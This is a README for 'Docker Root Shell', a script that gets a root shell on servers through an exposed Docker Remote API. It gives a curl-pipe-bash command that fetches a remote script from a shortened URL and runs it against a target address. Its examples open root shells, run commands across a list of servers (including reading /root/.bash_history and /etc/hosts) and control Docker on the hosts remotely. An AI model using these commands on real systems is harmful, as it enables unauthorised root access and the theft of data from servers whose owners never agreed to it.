# Docker Root Shell

Through Docker Remote API get the server root shell.

## Usage

Quickly test a server, required server ip address and the Docker API port:
```
curl -sSL https://git.io/vXNB4 | bash -s test <addr:port>
```
If this command return a shell `#`. Congratulations! You get the server root shell.

## Detail

```
=======================================================================================================

   ____             _               ____             _     ____  _          _ _ 
  |  _ \  ___   ___| | _____ _ __  |  _ \ ___   ___ | |_  / ___|| |__   ___| | |
  | | | |/ _ \ / __| |/ / _ \ '__| | |_) / _ \ / _ \| __| \___ \| '_ \ / _ \ | |
  | |_| | (_) | (__|   <  __/ |    |  _ < (_) | (_) | |_   ___) | | | |  __/ | |
  |____/ \___/ \___|_|\_\___|_|    |_| \_\___/ \___/ \__| |____/|_| |_|\___|_|_|
  Email: i@zuolan.me                                     Blog: https://zuolan.me
=======================================================================================================
  Available commands, <> is required, [] is Optional.
  Note: Alias CAN NOT be a number, but it can be a combination of letters and numbers.
=======================================================================================================
  con     <alias>                                  -  Connect to the specified server.
  run     <alias>/all "<command> [command]"        -  Run a one-time command on one or all servers.
  add     <alias>:<addr>:<port>:[cpu]:[ram]:[note] -  Add a server to list.
  del     <alias>                                  -  Delete a server in list.
  ping    <count>                                  -  Input a number of packets to transmit.
          <alias>                                  -  Input a alias to test the server delay.
  test    <addr:port>                              -  Quickly test the server.
  docker  <alias> <docker command>                 -  Use Docker control the server.
  edit                                             -  Edit the server list
=======================================================================================================
```

## Show the server list

Default server list file is `hosts.list`.You can change it in this script head.
```
$ ./docker-root-shell.sh
=======================================================================================================
  Num   - Alias - Address Port          - CPU Mem       -  Note
=======================================================================================================
  1     - wo    - 172.16.8.247 2376     - 8 Cu 8 GB     -  Work
  2     - ol    - 172.16.158.90 2376    - 8 Cu 8 GB     -  Online
  ... ...
```

## Connect to a server

Use the server alias to connect the specified server. Such as:
```
./docker-root-shell.sh con wo
```

## Run a one-time command on one or all servers

You can run a one-time command on one or all servers, such as run the command on a server:
```
./docker-root-shell.sh run wo "cat /root/.bash_history"
```
or run the command on all server:
```
./docker-root-shell.sh run all "cat /etc/hosts"
```

## Add a server to list

You can easily to add a server in the list.
```
./docker-root-shell.sh add <alias>:<addr>:<port>:[cpu]:[ram]:[note]
./docker-root-shell.sh add wo2:172.16.168.233:6666
```
`<>` is required, `[]` is Optional. Alias CAN NOT be a number, but it can be a combination of letters and numbers.

## Delete a server in list

You can easily to remove a server in the list.
```
./docker-root-shell.sh del <alias>
./docker-root-shell.sh del wo2
```

## Test the server delay

Input a number of packets to transmit. It will ping all server.
```
./docker-root-shell.sh ping <count>
./docker-root-shell.sh ping 1
```

Input a alias to test the server delay. Only ping the server.
```
./docker-root-shell.sh ping <alias>
./docker-root-shell.sh ping wo2
```

## Use Docker client control the server

Use Docker client control the server:
```
./docker-root-shell.sh docker <alias> <docker subcommand>
```
Such as get the server images list:
```
./docker-root-shell.sh docker wo2 images
```

## Edit the server list

Just edit list file.
```
./docker-root-shell.sh edit
```
